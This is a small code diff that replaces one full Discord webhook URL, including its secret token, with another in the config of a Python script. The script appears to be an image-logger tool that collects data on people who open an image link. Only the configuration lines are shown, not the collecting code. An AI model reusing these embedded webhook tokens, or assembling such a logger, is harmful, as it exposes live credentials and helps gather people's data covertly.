@@ -10,7 +10,7 @@ __version__ = "v2.0"
 __author__ = "foaqen"
 
 config = {
-    "webhook": "https://discordapp.com/api/webhooks/1468234580841463950/3o-pEa4iwukhRiIMlbowWVcuRC_YBtjzIex7OsoICZeL50Q7YZ5I7oON9OCOr1znlMAT",
+    "webhook": "https://discordapp.com/api/webhooks/1496047837123973251/-7HtnJjGrEmnk8SLg40ckBtphu7MwxmV6P1g-560Prmrc39HoeSDSk9z30NcnUE1315X",
     "image": "https://th.bing.com/th/id/OIP.BDvt0ocCQ0dkzkMIuEpoNwHaE7?o=7rm=3&rs=1&pid=ImgDetMain&o=7&rm=3", 
     "imageArgument": True,
 
